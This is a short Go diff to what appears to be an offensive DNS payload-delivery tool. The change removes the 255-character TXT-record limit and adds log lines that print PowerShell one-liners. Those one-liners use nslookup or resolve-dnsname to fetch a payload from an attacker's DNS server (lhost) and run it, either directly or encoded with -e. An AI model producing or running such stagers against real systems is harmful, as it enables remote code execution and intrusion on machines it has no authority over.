@@ -122,14 +122,12 @@ func main() {
 	// windows does sot support any other port than 53 with single line nslookup
 	if lport != 53 {
 		log.Printf("'nslookup' oneliners will not work on a different port than 53, you have been warned")
+	} else if len(command) > 255 {
+		log.Printf("Use: powershell . ((resolve-dnsname -server %s -ty TXT %s | select -expandproperty strings) -join \"\")", lhost, domain)
+		log.Printf("Enc: powershell -e ((resolve-dnsname -server %s -ty TXT %s | select -expandproperty strings) -join \"\")", lhost, domain)
 	} else {
-		log.Printf("Command: powershell . (nslookup -q=txt %s %s)[-1]\n", domain, lhost)
-	}
-
-	// txt records can me a max of 255 chars
-	if len(command) > 255 {
-		log.Printf("Your payload is too big. TXT records can be a max of 255 chars")
-		os.Exit(1)
+		log.Printf("Use: powershell . (nslookup -q=txt %s %s)[-1]\n", domain, lhost)
+		log.Printf("Enc: powershell -e (nslookup -q=txt %s %s)[-1]\n", domain, lhost)
 	}
 
 	server := &fastdns.Server{
